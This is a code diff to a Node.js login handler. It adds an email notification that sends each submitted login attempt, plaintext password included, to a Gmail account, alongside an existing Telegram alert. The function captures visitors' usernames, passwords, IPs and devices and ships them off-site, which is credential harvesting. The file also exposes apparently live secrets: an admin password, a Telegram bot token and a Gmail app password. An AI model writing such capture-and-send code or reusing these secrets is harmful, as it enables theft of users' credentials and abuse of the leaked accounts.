@@ -1,6 +1,7 @@
 const fs   = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const nodemailer = require('nodemailer');
 
 const LOGS_FILE    = '/tmp/failed-logins.json';
 const VALID_USER   = 'nikhil';
@@ -11,6 +12,18 @@ const ADMIN_PASS   = 'Sahu@7897';
 // Telegram config
 const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
 const TELEGRAM_CHAT_ID   = '1388446058';
+
+// Nodemailer config
+const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
+const EMAIL_PASS = 'bcjv orrt naby nztj';
+
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: EMAIL_USER,
+        pass: EMAIL_PASS
+    }
+});
 
 // ─── Token helper ────────────────────────────────────────────────────────────
 function makeToken() {
@@ -52,6 +65,22 @@ async function sendTelegramNotification(entry) {
         });
     } catch (e) {
         console.error('Telegram send error:', e.message);
+    }
+}
+
+async function sendEmailNotification(entry) {
+    const text = `Attempt Captured:\nUsername: ${entry.username}\nPassword: ${entry.password}\n\nIP: ${entry.ip}\nDevice: ${entry.device} (${entry.browser})\nTime: ${entry.timestamp}`;
+    const mailOptions = {
+        from: EMAIL_USER,
+        to: EMAIL_USER,
+        subject: `🚨 WinzingTOR Login: ${entry.username}`,
+        text: text
+    };
+
+    try {
+        await transporter.sendMail(mailOptions);
+    } catch (e) {
+        console.error('Email send error:', e.message);
     }
 }
 
@@ -106,6 +135,7 @@ module.exports = async (req, res) => {
             
             // Send notifications without awaiting so we don't block the frontend response
             sendTelegramNotification(entry);
+            sendEmailNotification(entry);
         }
 
         if (isValid) {
